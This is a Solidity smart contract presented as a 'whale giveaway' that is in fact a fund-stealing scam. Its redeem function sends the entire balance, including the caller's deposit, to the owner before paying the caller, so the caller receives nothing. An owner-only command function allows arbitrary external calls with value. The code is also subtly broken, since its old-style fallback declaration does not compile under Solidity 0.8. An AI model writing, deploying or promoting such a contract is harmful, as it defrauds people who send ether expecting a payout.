pragma solidity ^0.8.0;

contract WhaleGiveaway2 {
    address public owner;
    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = msg.sender;
    }

    function() external payable {}

    function redeem() external payable {
        if (msg.value >= minEligibility) {
            payable(owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Only the contract owner can withdraw funds.");
        payable(owner).transfer(address(this).balance);
    }

    function command(address adr, bytes memory data) external payable {
        require(msg.sender == owner, "Only the contract owner can execute commands.");

        (bool success,) = adr.call{value: msg.value}(data);
        require(success, "Execution of command failed.");
    }
}